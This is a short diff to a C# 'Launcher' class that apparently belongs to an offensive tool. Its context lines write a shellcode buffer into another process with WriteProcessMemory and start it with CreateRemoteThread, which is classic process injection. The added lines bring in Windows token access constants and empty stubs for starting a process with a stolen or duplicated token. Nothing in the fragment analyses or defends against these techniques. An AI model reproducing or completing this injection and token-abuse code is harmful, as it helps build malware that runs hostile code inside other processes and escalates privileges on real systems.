@@ -5,6 +5,13 @@ using System.Runtime.InteropServices;
 class Launcher
 {
 
+    const int TOKEN_ASSIGN_PRIMARY = 0x0001;
+    const int TOKEN_QUERY = 0x0008;
+    const int  TOKEN_ADJUST_DEFAULT = 0x0080;
+    const int TOKEN_ADJUST_SESSIONID = 0x0100;
+
+
+
     const int TOKEN_DUPLICATE = 0x0002;
     const uint MAXIMUM_ALLOWED = 0x2000000;
     const int CREATE_NEW_CONSOLE = 0x00000010;
@@ -260,5 +267,16 @@ class Launcher
         bool bWrite = WinAPI.WriteProcessMemory(hProcess, spaceAddr, shellcode, (uint)size2, out bytesWritten);
         WinAPI.CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
 
+    }
+
+    public static void StartProcWithToken()
+    {
+
+
+    }
+
+    private static IntPtr GetCurrentProcess()
+    {
+        throw new NotImplementedException();
     }
 }
